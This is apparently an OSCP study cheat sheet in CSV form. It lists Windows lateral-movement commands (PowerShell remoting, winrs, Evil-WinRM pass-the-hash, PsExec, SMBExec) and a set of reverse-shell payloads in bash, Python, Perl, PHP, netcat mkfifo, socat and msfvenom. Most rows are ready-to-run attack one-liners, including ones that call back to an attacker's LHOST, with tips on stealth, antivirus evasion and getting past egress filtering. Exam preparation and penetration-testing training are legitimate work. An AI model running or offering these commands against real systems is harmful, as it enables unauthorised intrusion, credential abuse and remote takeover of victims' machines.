"id","name","category","command","description","subcategory","notes","oscp_relevance"
"winrm-enter-pssession","WinRM - Enter-PSSession Interactive","active-directory","$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); Enter-PSSession -ComputerName <TARGET> -Credential $credential","Establish interactive PowerShell remoting session using Enter-PSSession (native Windows PowerShell)","lateral-movement","OSCP TRAINING MATERIAL - POWERSHELL REMOTING (ENTER-PSSESSION):
TRAINING WORKFLOW:
From OSCP module, PowerShell remoting demonstrated with session creation:
1.

Create PSCredential object (ConvertTo-SecureString + New-Object PSCredential)

2.

New-PSSession -ComputerName 192.168.50.73 -Credential $credential (creates session)

3.

Enter-PSSession 1 (connects to session ID 1 interactively)

4.

Commands execute remotely, verified with whoami/hostname showing FILES04

WHAT IS POWERSHELL REMOTING:
Microsoft's official remote administration protocol called ""PowerShell remoting"" - built-in WinRM capability accessed through PowerShell cmdlets.

Invoked via Enter-PSSession for interactive access.

PROTOCOL:
WinRM over WS-Management:
- Port 5985:
HTTP (plain HTTP traffic)
- Port 5986:
HTTPS (encrypted SSL/TLS traffic)
- Based on WS-Management open standard

GROUP MEMBERSHIP REQUIREMENT (CRITICAL):
User must be member of:
- Administrators group (default), OR
- Remote Management Users group

on the target machine.

PSCREDENTIAL OBJECT CREATION (REQUIRED):
Training shows three-step process:
  $username = 'jen'
  $password = 'Nexus123!'
  $secureString = ConvertTo-SecureString $password -AsPlaintext -Force
  $credential = New-Object System.Management.Automation.PSCredential $username, $secureString

This pattern is reusable across WMI, WinRM, and other PowerShell remote operations.

INTERACTIVE SESSION BEHAVIOR:
- Prompt changes to [TARGET]:
PS C:\Users\username>
- All commands execute in remote PowerShell context
- Current directory, environment variables are REMOTE system's
- Exit-PSSession returns to local prompt
- Session persists after disconnection (can reconnect with Enter-PSSession)

COMPARISON - ENTER-PSSESSION VS NEW-PSSESSION:
- Enter-PSSession:
  Interactive (like SSH), single target, manual command entry

- New-PSSession:
  Creates session object for programmatic use with Invoke-Command

- Both use WinRM, same port requirements, same authentication

LOGGING & DETECTION:
- Event ID 4624:
Logon event (Type 3:
Network logon)
- Event ID 4688:
Process creation (PowerShell.exe)
- WinRM event logs:
Microsoft-Windows-WinRM/Operational
- PowerShell script block logging (if enabled)
- MORE VISIBLE than WMI/DCOM - creates legitimate admin session logs

WHOAMI BEHAVIOR:
Training notes whoami shows remote user identity correctly (corp\jen on FILES04), confirming remote execution context.

Time:
2-3 minutes (PSCredential creation + session establishment + verification)

EXAM STRATEGY:
Most stable and feature-rich Windows→Windows lateral movement.

Use when you control Windows attack box and want interactive access.

For automation, use Invoke-Command or New-PSSession.","high"
"winrm-new-pssession","WinRM - New-PSSession Reusable Session","active-directory","$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); $session = New-PSSession -ComputerName <TARGET> -Credential $credential; Invoke-Command -Session $session -ScriptBlock {<COMMAND>}","Create persistent reusable PowerShell remoting session with New-PSSession for multiple command execution","lateral-movement","EDUCATIONAL CONTEXT:
New-PSSession creates persistent session object for efficient multi-command execution.

WHY PERSISTENT:
Avoids re-authentication overhead for each command - session remains open until explicitly removed.

ADVANTAGES OVER ENTER-PSSESSION:
- Non-blocking (can run commands in background)
- Supports parallel execution on multiple targets
- Better for automation

USE CASE:
Batch automation - execute multiple scripts without reconnecting.

PERFORMANCE:
- First command slower (session creation)
- Subsequent commands faster (reuse)

SESSION MANAGEMENT:
- View sessions:
Get-PSSession
- Remove session:
Remove-PSSession $session
- Timeout:
Default idle timeout 4 hours (configurable with -SessionOption)

PARALLEL EXECUTION:
Create array of sessions, use Invoke-Command -Session $sessions -Parallel.

Time:
2-3 minutes for setup, <1 minute per subsequent command

EXAM TIP:
Use for scripted enumeration across multiple targets.","high"
"winrm-invoke-command","WinRM - Invoke-Command One-Shot Execution","active-directory","$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); Invoke-Command -ComputerName <TARGET> -Credential $credential -ScriptBlock {<COMMAND>}","Execute single PowerShell command remotely without persistent session using Invoke-Command","lateral-movement","EDUCATIONAL CONTEXT:
Invoke-Command is PowerShell's most versatile remote execution method - supports one-shot and persistent sessions.

WHY ONE-SHOT:
Quick command execution without session management overhead.

WHEN TO USE:
- Single command
- Quick enumeration
- Testing connectivity

COMPARISON:
- Faster for single command than Enter-PSSession (no interactive overhead)
- Slower for multiple commands than New-PSSession (no session reuse)

MULTIPLE TARGETS:
Supports parallel execution:
  Invoke-Command -ComputerName @('target1','target2','target3') -ScriptBlock {whoami}

SCRIPT EXECUTION:
Use -FilePath to execute local script on remote system:
  Invoke-Command -FilePath .\script.ps1 -ComputerName <TARGET> -Credential $credential

OUTPUT HANDLING:
Results include PSComputerName property for multi-target tracking.

ALTERNATIVE SYNTAX:
Shorter form:
  Invoke-Command -ComputerName <TARGET> {<COMMAND>} -Credential $credential

Time:
1-2 minutes per command

EXAM TIP:
Best for quick enumeration, use New-PSSession for sustained access.","high"
"winrm-winrs","WinRM - Legacy winrs.exe Command","active-directory","winrs -r:<TARGET> -u:<USER> -p:<PASS> <COMMAND>","Execute commands remotely using legacy winrs.exe utility (Windows Remote Shell)","lateral-movement","OSCP TRAINING MATERIAL - WINRS (WINDOWS REMOTE SHELL):
TRAINING EXAMPLE:
From OSCP module, jen's credentials used to execute commands remotely on FILES04:
  winrs -r:files04 -u:jen -p:Nexus123! ""cmd /c hostname & whoami""

EXPECTED OUTPUT:
  FILES04
  corp\jen

WHAT IS WINRS:
Windows Remote Shell - command-line WinRM client pre-dating PowerShell remoting.

Built into all modern Windows systems.

Alternative to PsExec/WMI when PowerShell unavailable.

PROTOCOL:
WinRM over WS-Management:
- Port 5986:
Encrypted HTTPS traffic
- Port 5985:
Plain HTTP
- Microsoft's implementation of WS-Management protocol

GROUP MEMBERSHIP REQUIREMENT (CRITICAL):
For winRS to work, domain user must be part of:
- Administrators group (local admin rights), OR
- Remote Management Users group on target host

This is explicitly stated in training:
""For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.""

REVERSE SHELL DEPLOYMENT:
Training shows replacing commands with base64-encoded PowerShell reverse shell:
  winrs -r:files04 -u:jen -p:Nexus123! ""powershell -nop -w hidden -e JABjAGwAaQBlAG4A...""

This spawned reverse shell to Netcat listener on Kali (port 443), achieving lateral movement.

LIMITATIONS VS POWERSHELL REMOTING:
- cmd.exe commands only (unless invoking powershell.exe)
- No interactive persistent session
- No tab completion or command history
- Less sophisticated than Enter-PSSession

COMMAND EXECUTION SYNTAX:
- Use ""cmd /c"" prefix for multiple commands:
  winrs -r:files04 ""cmd /c hostname & whoami""

- Quote entire command string
- Commands execute in cmd.exe context, NOT PowerShell

WHEN TO USE IN OSCP:
- PowerShell remoting blocked/restricted
- Quick one-off command execution
- Older Windows systems (pre-PowerShell 2.0)
- Compatibility with cmd.exe-based tools

Time:
<1 minute per command execution

EXAM STRATEGY:
Prefer PowerShell remoting (Enter-PSSession/Invoke-Command) for better functionality.

Use winrs as fallback when PowerShell restricted.","medium"
"evil-winrm-creds","Evil-WinRM - Password Authentication","active-directory","evil-winrm -i <TARGET> -u <USER> -p '<PASS>'","Establish interactive PowerShell remoting from Kali using Evil-WinRM with password authentication","lateral-movement","EDUCATIONAL CONTEXT:
Evil-WinRM is Ruby-based WinRM client for Kali - preferred tool for Windows lateral movement from Linux.

WHY EVIL-WINRM:
- Built-in file upload/download
- PowerShell script loading
- Executable management
- Tab completion
- Command history

ADVANTAGES:
- Native feel (PowerShell prompt)
- Upload/download commands
- Menu system (help menu)

FILE OPERATIONS:
  upload /kali/path C:\Windows\Temp\file.exe
  download C:\Users\user\file.txt /kali/path

SCRIPT LOADING:
Use -s /path/to/scripts to auto-load PowerShell scripts:
  evil-winrm -i <TARGET> -u <USER> -p '<PASS>' -s /opt/powershell

Scripts accessible with script_name (no .ps1 extension).

EXECUTABLE MENU:
Use -e /path/to/exes for pre-loaded binaries:
  evil-winrm -i <TARGET> -u <USER> -p '<PASS>' -e /opt/binaries

Run with Invoke-Binary.

STEALTH:
Creates standard WinRM logs (Event ID 4624, 4688) - same as legitimate admin access.

COMPARISON:
More features than Invoke-Command, easier than PSExec from Kali.

Time:
1-2 minutes for connection

EXAM TIP:
First choice for Kali → Windows lateral movement, most stable and feature-rich.

COMMON LOCATIONS:
Default Kali install, or:
  gem install evil-winrm","high"
"evil-winrm-hash","Evil-WinRM - Pass-the-Hash","active-directory","evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>","Authenticate to WinRM using NTLM hash instead of password (pass-the-hash attack)","lateral-movement","EDUCATIONAL CONTEXT:
Pass-the-hash allows authentication with NTLM hash without knowing plaintext password - critical for lateral movement.

WHY THIS WORKS:
Windows NTLM authentication accepts hash directly - password never needed if you have hash.

HASH EXTRACTION:
Obtain hashes with:
- secretsdump.py (Impacket)
- mimikatz (lsadump::sam)
- crackmapexec --sam

HASH FORMAT:
Only need NTLM portion (32 hex chars), LM hash optional:
- If both available:
  -H LM:NTLM

- If NTLM only:
  -H :NTLM_HASH
  OR
  -H NTLM_HASH

STEALTH:
Creates same logs as password authentication - hash usage not visible in logs.

PERSISTENCE:
Hash remains valid until password changed - can reuse for multiple sessions.

LATERAL MOVEMENT:
Same hash works across all machines where account is local admin (local accounts) or domain member (domain accounts).

Time:
1-2 minutes (same as password auth)

EXAM TIP:
Critical technique after dumping SAM/NTDS - enables lateral movement without password cracking.","high"
"test-wsman","WinRM - Test-WSMan Verification","active-directory","Test-WSMan -ComputerName <TARGET>","Verify WinRM service is accessible and responding on target before attempting authentication","lateral-movement","EDUCATIONAL CONTEXT:
Test-WSMan performs unauthenticated connectivity test to WinRM service - quick way to verify WinRM availability before attempting authentication.

WHY TEST FIRST:
Avoids failed authentication attempts, validates port accessibility, identifies protocol version.

WHAT IT CHECKS:
WinRM service responding, protocol version supported, product version (Windows OS).

NO CREDENTIALS:
Basic test requires no authentication - checks if service is listening.

PORTS:
Default HTTP on 5985, HTTPS on 5986 (use -UseSSL).

VERBOSE OUTPUT:
Returns XML identifying service details (wsmid, ProtocolVersion, ProductVendor).

ALTERNATIVE TEST:
From Kali use nmap -p 5985,5986 or crackmapexec winrm <TARGET> (shows WINRM in banner).

TIME ESTIMATE:
<30 seconds.

EXAM TIP:
Quick check before attempting lateral movement - confirms WinRM available.","medium"
"winrm-revshell-invoke","WinRM - PowerShell Reverse Shell via Invoke-Command","active-directory","$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); Invoke-Command -ComputerName <TARGET> -Credential $credential -ScriptBlock {powershell -nop -w hidden -e <BASE64_PAYLOAD>}","Deploy base64-encoded PowerShell reverse shell through WinRM for callback to attacker","lateral-movement","EDUCATIONAL CONTEXT:
Combines WinRM lateral movement with PowerShell reverse shell for full interactive callback.

WHY BASE64:
Avoids escaping issues with special characters in PowerShell one-liner, bypasses some basic AV signature detection.

HOW TO GENERATE PAYLOAD:
Use base64-encode-powershell command or:
$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload); $encoded = [Convert]::ToBase64String($bytes).

WHAT HAPPENS:
Invoke-Command executes 'powershell -e' on target → target decodes base64 → executes reverse shell → connects back to LHOST:LPORT.

STEALTH CONSIDERATIONS:
-w hidden prevents visible window, -nop avoids profile scripts, base64 bypasses simple string detection.

LOGGING:
Creates WinRM event logs (Event ID 4624, 4688) and PowerShell script block logging if enabled.

MANUAL DECODE TEST:
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>')) to verify payload.

ALTERNATIVES:
Use Evil-WinRM to upload nc.exe or other reverse shell binary.

TIME ESTIMATE:
3-5 minutes including payload generation and listener setup.

EXAM TIP:
Pre-generate base64 payloads before exam for common LHOST/LPORT combinations.","high"
"psexec-impacket-shell","PSExec - Impacket Interactive Shell","active-directory","impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET>","Execute Impacket PSExec from Kali to gain SYSTEM-level interactive shell on remote Windows via SMB","lateral-movement","EDUCATIONAL CONTEXT:
PSExec is classic lateral movement technique providing SYSTEM-level shell immediately.

WHY THIS WORKS:
Uploads binary to ADMIN$ share, creates Windows service, executes payload as SYSTEM.

HOW IT WORKS:
1) Connects to IPC$ share, 2) Uploads RemCom.exe to ADMIN$ share, 3) Creates/starts service via SCM, 4) Service executes RemCom.exe as SYSTEM, 5) Spawns cmd.exe shell.

ADVANTAGES:
Spawns SYSTEM shell (highest privilege), most reliable for OSCP, well-documented.

DISADVANTAGES:
Writes binary to disk (forensics), creates service (event logs), easier to detect than WMI/DCOM.

MANUAL ALTERNATIVE:
Microsoft PsExec64.exe from Sysinternals (see psexec-sysinternals).

UAC LIMITATION:
2014 Microsoft patch blocks local admin PTH for non-RID-500 accounts (domain users unaffected).

CLEANUP:
PSExec automatically cleans up service and binary on exit.

BEHIND THE SCENES:
Service creation generates Event ID 7045, authentication creates 4624, process creation 4688.

TIME ESTIMATE:
1-2 minutes for connection establishment.

EXAM TIP:
First lateral movement technique to try when credentials available - most stable and straightforward.","high"
"psexec-sysinternals","PSExec - Microsoft Sysinternals (Kerberos)","active-directory","PsExec64.exe -accepteula \\<TARGET> -u <DOMAIN>\<USER> -p <PASS> cmd","Execute Microsoft official PsExec64.exe from compromised Windows host (requires Kerberos authentication)","lateral-movement","OSCP TRAINING MATERIAL - PSEXEC FROM SYSINTERNALS SUITE:
TRAINING EXAMPLE:
From OSCP module, jen's credentials used from CLIENT74 to move laterally to FILES04:
'PS C:\Tools\SysinternalsSuite> .\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd'

Output confirmed successful lateral movement:
- PsExec v2.4 banner
- Interactive cmd.exe shell on FILES04
- 'whoami' returned 'corp\jen'
- 'hostname' returned 'FILES04'

THREE PREREQUISITES (CRITICAL - FROM TRAINING):
1.

User must be part of Administrators local group
2.

ADMIN$ share must be available  
3.

File and Printer Sharing has to be turned on

Training explicitly states:
""Luckily for us, the last two requirements are already met as they are the default settings on modern Windows Server systems.""

HOW PSEXEC WORKS (TECHNICAL BREAKDOWN FROM TRAINING):
1.

Writes psexesvc.exe into C:\Windows directory on target
2.

Creates and spawns a service on the remote host  
3.

Runs the requested program/command as a child process of psexesvc.exe

This is why you see 'Starting PSEXESVC service' in the output.

EXECUTION CONTEXT:
From training scenario:
- Attacker already had RDP access as offsec local admin on CLIENT74
- PsExec binary available at C:\Tools\SysinternalsSuite (full suite pre-installed)
- Executed 64-bit version (PsExec64.exe) for modern Windows targets
- Used -i flag for interactive session (spawns visible cmd.exe shell)

FLAG BREAKDOWN:
- -i:
Interactive mode (required for visible shell in training example)
- \\FILES04:
Target server (double backslash UNC path syntax)
- -u corp\jen:
Domain\username format (jen is domain user + local admin on FILES04)
- -p Nexus123!:
Password in plaintext
- cmd:
Command to execute (spawns interactive command shell)

SYSINTERNALS SUITE LOCATION IN OSCP LABS:
C:\Tools\SysinternalsSuite
- Full suite includes:
PsExec, PsInfo, PsKill, PsList, etc.
- Available on compromised Windows clients in OSCP environment
- No download needed - pre-staged in common locations

KERBEROS VS NTLM:
- Sysinternals PSExec uses Kerberos authentication (requires hostname or FQDN)
- Cannot use IP addresses directly (Kerberos requires SPN with hostname)
- Impacket PSExec uses NTLM (IP addresses work)

MICROSOFT LEGITIMACY:
- Signed by Microsoft Corporation
- Trusted by Windows Defender and enterprise AV
- Appears as legitimate admin tool in logs
- Whitelisted by default on most corporate systems

WHEN TO USE IN OSCP:
- Already pivoted to Windows client (CLIENT74, CLIENT76, etc.)
- Have domain credentials with local admin rights
- Target hostname known (not just IP)
- Want most reliable/stable lateral movement from Windows

COMPARISON - SYSINTERNALS VS IMPACKET PSEXEC:
- Sysinternals:
Windows→Windows, Kerberos, hostname required, Microsoft-signed
- Impacket:
Kali→Windows, NTLM, IP addresses work, Python-based

SERVICE CREATION (FORENSIC ARTIFACT):
- Event ID 7045:
Service installed (PSEXESVC)
- Service Name:
PSEXESVC
- Service File Name:
%SystemRoot%\PSEXESVC.exe
- Service Type:
User mode service
- Service Start Type:
Demand start

CLEANUP:
PSExec automatically removes PSEXESVC.exe and stops/deletes service on exit (clean disconnection).

TIME ESTIMATE:
2-3 minutes (including locating binary, command construction, execution).

EXAM STRATEGY:
Use Impacket PSExec from Kali for initial lateral movement.

Use Sysinternals PSExec when pivoting through compromised Windows clients with domain credentials.","high"
"psexec-sysinternals-interactive","PSExec - Interactive Desktop Session","active-directory","PsExec64.exe -accepteula \\<TARGET> -u <DOMAIN>\<USER> -p <PASS> -i <SESSION_ID> <COMMAND>","Launch interactive GUI application on remote system with visible desktop using PsExec -i flag","lateral-movement","EDUCATIONAL CONTEXT:
PSExec -i flag spawns process in user's interactive desktop session (Session 1+) instead of Session 0 (services).

WHY SESSION 0 vs SESSION 1+:
Windows services run in Session 0 (non-interactive, no GUI), user desktops run in Session 1+ (interactive).

DEFAULT BEHAVIOR:
Without -i, PSExec spawns in Session 0 - GUI apps invisible.

USE CASE:
Social engineering (spawn message to user), GUI tool demonstration, test interactive applications.

BEHIND THE SCENES:
-i flag tells PSEXESVC service to create process in specified session ID.

QUERY SESSIONS:
Use 'query user' or 'query session' to enumerate session IDs on target.

COMMON SESSION IDS:
Session 0 = services, Session 1 = first logged-on user, Session 2+ = additional users (RDP, fast user switching).

STEALTH:
Visible process to logged-in user - not stealthy.

TIME ESTIMATE:
3-5 minutes including session enumeration.

EXAM TIP:
Rarely needed for OSCP - use standard psexec for command execution.

Interactive mode more relevant for social engineering or GUI testing.","medium"
"smbexec-impacket-fileless","SMBExec - Impacket Fileless Shell","active-directory","impacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET>","Semi-interactive shell via SMB using Impacket SMBExec - fileless alternative to PSExec (no binary written to disk)","lateral-movement","EDUCATIONAL CONTEXT:
SMBExec provides fileless lateral movement alternative to PSExec for maximum stealth and minimal forensic footprint.

HOW IT WORKS:
1) Creates temporary batch file in ADMIN$ share, 2) Executes batch file via service, 3) Batch file runs command and redirects output to temp file, 4) SMBExec retrieves output via SMB, 5) Deletes batch and output files.

FILELESS BENEFIT:
No persistent binary on disk (unlike PSExec which uploads RemCom.exe).

STEALTH:
Less detectable than PSExec - no binary signature, no service binary, only batch files (auto-deleted).

DISADVANTAGES:
Slower than PSExec (file creation/deletion per command), less stable for long sessions.

COMPARISON:
PSExec (fast, stable, binary on disk) vs SMBExec (slow, stealthy, fileless).

USE CASE:
Maximum stealth required, antivirus detection concern, forensic evasion.

SERVICE CREATION:
Still creates service for execution (Event ID 7045) but no persistent binary.

OUTPUT MODES:
-mode SHARE (default, uses ADMIN$) vs -mode SERVER (creates temp SMB server on Kali).

TIME ESTIMATE:
2-4 minutes for initial connection, slower per-command execution.

EXAM TIP:
Use SMBExec when PSExec detected/blocked by AV, or when stealth is priority over speed.","high"
"psexec-verify-firewall","PSExec - Verify File and Printer Sharing Ports","active-directory","sudo nmap -p 445,135 -Pn -sV -v <TARGET>","Verify required ports for PSExec are open (SMB 445 and RPC 135 for service creation)","lateral-movement","EDUCATIONAL CONTEXT:
PSExec requires both SMB (445) and RPC (135) ports - verify before attempting lateral movement to save time.

WHY BOTH PORTS:
Port 445 for ADMIN$ share access (binary upload), port 135 for service creation via RPC.

FIREWALL DEFAULTS:
Windows Server enables File and Printer Sharing by default, workstations often block it.

SERVICE DETECTION:
-sV flag identifies SMB version (SMBv1, SMBv2, SMBv3) - important for compatibility.

MANUAL ALTERNATIVE:
Test SMB manually:
smbclient -L //<TARGET> -U <USER>.

ALTERNATIVE PORTS:
If 445 blocked, PSExec won't work - use WinRM (5985) or WMI (135 only).

BEHIND THE SCENES:
nmap sends SYN packets to ports, analyzes responses, fingerprints services.

STEALTH:
This is enumeration - creates logs on target (connection attempts).

TIME ESTIMATE:
30 seconds to 1 minute for port scan.

EXAM TIP:
Always verify ports before exploitation attempts - prevents wasted time troubleshooting authentication when ports are blocked.","high"
"cme-smb-shares","CrackMapExec - Enumerate SMB Shares","active-directory","crackmapexec smb <TARGET> -u <USER> -p <PASS> --shares","Enumerate accessible SMB shares on target including ADMIN$, C$, IPC$ using CrackMapExec","lateral-movement","EDUCATIONAL CONTEXT:
Share enumeration confirms ADMIN$ accessibility - prerequisite for PSExec lateral movement.

WHY ADMIN$ MATTERS:
PSExec uploads binary to ADMIN$ share, creates service, executes payload.

PWNED INDICATOR:
[+] Pwn3d! confirms user has local administrator rights on target.

DEFAULT SHARES:
ADMIN$ (C:\Windows), C$ (C:\), IPC$ (inter-process communication), print$ (printer drivers).

CUSTOM SHARES:
Additional shares may contain sensitive data - enumerate contents.

PERMISSIONS:
READ,WRITE on ADMIN$ required for PSExec.

READ-only means user not admin.

ALTERNATIVE TOOLS:
smbclient -L //<TARGET> -U <USER> (manual), smbmap -u <USER> -p <PASS> -H <TARGET> (detailed permissions).

BEHIND THE SCENES:
Authenticates to IPC$ share, queries share list via SRVSVC RPC pipe.

TIME ESTIMATE:
<30 seconds for share enumeration.

EXAM TIP:
Always verify ADMIN$ accessible before attempting PSExec - saves time troubleshooting failed exploitation.","high"
"nc-listener-setup","Netcat Listener Setup","exploitation","nc -nlvp <LPORT>","Start a netcat listener to catch reverse shells","shells","Use port 443 to bypass egress filtering.

Always start listener BEFORE triggering reverse shell on target.","high"
"bash-reverse-shell","Bash Reverse Shell","exploitation","bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1","Establish reverse shell using bash built-in TCP socket","shells","Works on most Linux systems.

Firewall-friendly when using port 443/80.

URL-encode for web shells:
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<LHOST>%2F<LPORT>%200%3E%261%27","high"
"python-shell-upgrade","Python PTY Shell Upgrade","exploitation","python3 -c 'import pty;pty.spawn(""/bin/bash"")'","Upgrade dumb shell to interactive PTY shell with tab completion","shells","First step in shell stabilization.

Always upgrade shells immediately after catching them.

Python3 preferred but python2 works identically.

After upgrade, run:
export TERM=xterm","high"
"stty-shell-stabilization","STTY Shell Stabilization","exploitation","python3 -c 'import pty;pty.spawn(""/bin/bash"")' && export TERM=xterm && stty raw -echo; fg","Fully stabilize reverse shell with proper terminal settings (tab completion, CTRL+C, arrow keys)","shells","Full sequence:
1) python3 -c 'import pty;pty.spawn(""/bin/bash"")' 2) CTRL+Z 3) stty raw -echo; fg 4) export TERM=xterm 5) stty rows 38 cols 116 (match your terminal size with 'stty -a')","high"
"msfvenom-windows-reverse-tcp","Msfvenom Windows Reverse TCP Payload","exploitation","msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <OUTPUT_FILE>","Generate Windows reverse shell executable payload","shells","For 32-bit:
use 'windows/shell_reverse_tcp'.

For staged payload:
use 'windows/x64/shell/reverse_tcp'.

Common formats:
exe, dll, aspx, jsp, war.

Always test on similar system first.","high"
"msfvenom-linux-reverse-tcp","Msfvenom Linux Reverse TCP Payload","exploitation","msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o <OUTPUT_FILE>","Generate Linux reverse shell ELF binary","shells","For 32-bit:
use 'linux/x86/shell_reverse_tcp'.

After transfer:
chmod +x shell.elf && ./shell.elf.

Consider using bash/python one-liners instead if msfvenom binaries are detected.","high"
"msfvenom-php-webshell","Msfvenom PHP Web Shell","exploitation","msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o <OUTPUT_FILE>","Generate PHP reverse shell for web application exploitation","shells","Alternative:
PentestMonkey PHP reverse shell (more reliable).

Check disabled_functions in phpinfo() - may need to use alternative payload.

Common upload bypasses:
.phtml, .php5, .php3, .inc","high"
"msfvenom-aspx-webshell","Msfvenom ASPX Web Shell","exploitation","msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o <OUTPUT_FILE>","Generate ASP.NET reverse shell for IIS web application exploitation","shells","Works on IIS servers with ASP.NET enabled.

For ASP classic (older IIS):
use '-f asp' instead.

Test upload restrictions first.

Consider using cmd.aspx for simple command execution if reverse shell blocked.","high"
"netcat-reverse-shell-mkfifo","Netcat Reverse Shell (mkfifo)","exploitation","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f","Netcat reverse shell without -e flag using named pipes (FIFO)","shells","Works when netcat compiled without -e flag.

Named pipe creates bi-directional channel.

Alternative locations for pipe:
/dev/shm/f (tmpfs, no disk writes), /var/tmp/f (persistent across reboots).","high"
"python-reverse-shell","Python Reverse Shell","exploitation","python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""<LHOST>"",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'","Python-based reverse shell using socket and subprocess modules","shells","Works on most Linux systems.

More reliable than bash /dev/tcp method.

URL-encode for web shells.

Python2 version identical, just use 'python' instead of 'python3'.

One-liner format ideal for RCE exploitation.","high"
"perl-reverse-shell","Perl Reverse Shell","exploitation","perl -e 'use Socket;$i=""<LHOST>"";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'","Perl-based reverse shell using Socket module","shells","Perl is commonly installed on older Linux/Unix systems.

Less common than bash/python but useful when those aren't available.

One-liner format ideal for command injection.","medium"
"php-reverse-shell","PHP Reverse Shell","exploitation","php -r '$sock=fsockopen(""<LHOST>"",<LPORT>);exec(""/bin/sh -i <&3 >&3 2>&3"");'","PHP reverse shell one-liner using fsockopen","shells","Useful for PHP command injection or when you have PHP RCE.

Check disabled_functions with:
php -r 'print_r(ini_get(""disable_functions""));'.

Alternative functions:
system(), passthru(), shell_exec(), popen(), proc_open().","high"
"pty-spawn-script","Spawn PTY Shell with Script","exploitation","script /dev/null -c bash","Spawn a proper PTY shell using script command to enable job control, tab completion, and clear screen functionality","shell-utilities","CRITICAL OSCP TECHNIQUE: First step after gaining reverse shell.

WHY PTY shell matters:
(1) Job control - Ctrl+Z to background processes
(2) Tab completion - essential for enumeration
(3) Clear screen - Ctrl+L works
(4) Arrow keys - command history navigation
(5) Signal handling - Ctrl+C doesn't kill shell
(6) Interactive programs - su, sudo, ssh work properly

Full shell upgrade sequence:
1. Spawn PTY: script /dev/null -c bash
2. Background: Ctrl+Z
3. Raw mode: stty raw -echo; fg
4. Press Enter twice
5. Set terminal: export TERM=xterm
6. Set size: stty rows X cols Y

Alternatives if script not available:
- Python3: python3 -c 'import pty; pty.spawn(""/bin/bash"")'
- Python2: python -c 'import pty; pty.spawn(""/bin/bash"")'
- Perl: perl -e 'exec ""/bin/bash"";'
- socat (on target): socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:PORT

Manual verification:
Before upgrade: Ctrl+C kills shell, tab completion broken, clear fails
After upgrade: Full interactive shell with all features

OSCP exam tip: ALWAYS upgrade shell immediately after foothold. Practice the full sequence until muscle memory.

Time estimate: 30 seconds","high"
